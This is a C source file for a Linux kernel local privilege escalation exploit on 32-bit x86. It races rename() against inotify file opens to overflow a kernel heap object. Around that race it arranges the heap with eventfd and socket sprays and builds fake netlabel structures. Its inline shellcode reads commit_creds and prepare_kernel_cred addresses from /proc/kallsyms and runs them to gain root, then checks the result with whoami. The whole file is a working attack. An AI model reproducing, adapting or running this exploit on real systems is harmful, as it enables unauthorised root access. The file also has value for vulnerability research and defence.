#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <signal.h>
#include <sys/eventfd.h>
#include <sys/mman.h>
#define SOCKNUM 3
#define FDNUM 150
void *callrename( void *ptr );
void *openclose( void *ptr );
void return_to_userspace();
void userspace();
pthread_t thread1, thread2;
int lastfd,commit_creds,prepare_kernel_cred,saved_ss,saved_esp,saved_eflags,saved_cs,ptr_userspace;
int efd[FDNUM];
char fake_lsm_cache[12];
char shellcode[20];
main()
{ 
     int  iret1, iret2,i;
     FILE *fp;
     printf("fake_lsm here: %p\n",fake_lsm_cache);
     printf("shellcode here: %p\n",shellcode);
     system("whoami");
     setvbuf(stdout,0,2,0);

     /* Firstly use some socket() to make sure following steps are done on a new slub page */
     for (i=0;i<50;i++)
     {
        int fd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
     }

     /* Arranging heap fengshui with some eventfd() functions, which also do kmalloc(32) */
     for (i=0;i<FDNUM;i++)
    {
        efd[i]=eventfd(0, 0);
    }
    for (i=0;i<FDNUM;i++)
    {
        close(efd[i]);
    }

    /* Get address of commit_creds and prepare_kernel_cred syscall */
     fp=popen("grep commit_creds /proc/kallsyms|awk \'{print $1}\'","r");
     fscanf(fp,"%8x",&commit_creds);
     fp=popen("grep prepare_kernel_cred /proc/kallsyms|awk \'{print $1}\'","r");
     fscanf(fp,"%8x",&prepare_kernel_cred);
     
     /* Make our shellcode executable */
     mmap(shellcode,14,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,-1,0);
     
     /*
     xor %eax, %eax;
     call prepare_kernel_cred;
     call commit_creds;
     jmp return_to_userspace;
     */
     strcpy(shellcode,"\x31\xc0\xe8");
     *(int*)(shellcode+3)=prepare_kernel_cred-5-(int)shellcode-2;
     strcat(shellcode,"\xe8");
     *(int*)(shellcode+8)=commit_creds-5-(int)shellcode-7;
     strcat(shellcode,"\xe9");
     *(int*)(shellcode+13)=(int)return_to_userspace-5-(int)shellcode-12;

     /* save esp, ss, cs, eflags register for further iret */
     asm("pushl %esp;popl saved_esp;");
     saved_esp-=0x100;
     asm("pushl %ss;popl saved_ss;");
     asm("pushl %cs;popl saved_cs;");
     asm("pushf;popl saved_eflags;");

     ptr_userspace=&userspace;
     printf("press enter to continue\n");
     getchar();
     iret1 = pthread_create( &thread1, NULL, callrename, NULL);
     if(iret1)
     {
         fprintf(stderr,"Error - pthread_create() return code: %d\n",iret1);
         exit(EXIT_FAILURE);
     }
     iret2 = pthread_create( &thread2, NULL, openclose, NULL);
     if(iret2)
     {
         fprintf(stderr,"Error - pthread_create() return code: %d\n",iret2);
         exit(EXIT_FAILURE);
     }
     pthread_join( thread1, NULL);
     pthread_join( thread2, NULL); 
     exit(EXIT_SUCCESS);
}

void *callrename( void *ptr )
{
    int i,m;
    char longname[30];
    strcpy(longname,"test_dir/aaaa");

    /*
    Following is a fake netlbl_lsm_secattr structure 
    (We faked until netlbl_lsm_cache)
    struct netlbl_lsm_secattr {
    u32 flags;
    u32 type;
    char *domain;
    struct netlbl_lsm_cache *cache;
    struct {
        struct {
            struct netlbl_lsm_catmap *cat;
            u32 lvl;
        } mls;
        u32 secid;
    } attr;
    };
    */
    strcat(longname,"\x02\x01\x01\x02"); //flags
    strcat(longname,"\x01\x01\x01\x01"); //type
    strcat(longname,"\x01\x01\x01\x01"); //domain
    *(int*)(longname+25)=(int)fake_lsm_cache;

    /*
    Following is a fake netlbl_lsm_cache structure 
    struct netlbl_lsm_cache {
    atomic_t refcount;
    void (*free) (const void *data);
    void *data;
    };
    */
    *(int*)(fake_lsm_cache)=1;
    *(int*)(fake_lsm_cache+4)=(int)shellcode;

    for (i=0;i<20000;i++)
    {
    /* continuously do rename() in one function. longname contain pointer to fake_lsm_cache */
     rename("test_dir/f",longname);
     rename(longname,"test_dir/f");
    }
    printf("out of loop\n");
    printf("press enter to continue\n");
    getchar();
}
void *openclose( void *ptr )
{
    int j,fd,m,portno,sockfd[SOCKNUM];
    struct sockaddr_in serv_addr;
    for (j=0;j<2000;j++)
    {
    /* keep opening a file in another thread to trigger inotify_handle_event() function */
    fd=open("test_dir/f",O_RDWR);
    for (m=0;m<SOCKNUM;m++){
    if(sockfd[m]!=0)

    close(sockfd[m]);}
    if (fd!=-1)
    {
    	close(fd);

        /* Try to put a netlbl_lsm_secattr struct right after inotify_event_info as target of overflow */
    	for (m=0;m<SOCKNUM;m++)
    	{
    	sockfd[m]=socket(AF_INET,SOCK_STREAM,0);
    	}
    	for (m=0;m<SOCKNUM;m++)
    	{
    	bzero((char *) &serv_addr, sizeof(serv_addr));
	   serv_addr.sin_family = AF_INET;
	   serv_addr.sin_addr.s_addr = INADDR_ANY;
	   serv_addr.sin_port = htons(5000+m);
	   bind(sockfd[m], (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    	}
    }
    }
}
void return_to_userspace()
{
	/* push arguments needed for iret onto stack */
	asm("pushl saved_ss;pushl saved_esp;pushl saved_eflags;pushl saved_cs;pushl ptr_userspace;");
	asm("iret");
}
void userspace()
{
    /* check whether our attack is successful */
	system("whoami");
	exit(0);
}